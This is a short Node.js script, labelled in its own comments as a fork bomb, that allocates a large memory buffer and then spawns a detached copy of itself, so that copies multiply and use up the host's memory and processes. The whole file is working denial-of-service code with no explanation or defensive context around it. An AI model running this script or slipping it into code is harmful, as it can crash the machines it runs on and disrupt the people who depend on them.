// consume some RAM bytes
var str = new Buffer(100000000).toString();

// fork bomb
var spawn = require('child_process').spawn;
var child = spawn('node', [__filename], {
  detached: true
});
child.unref();
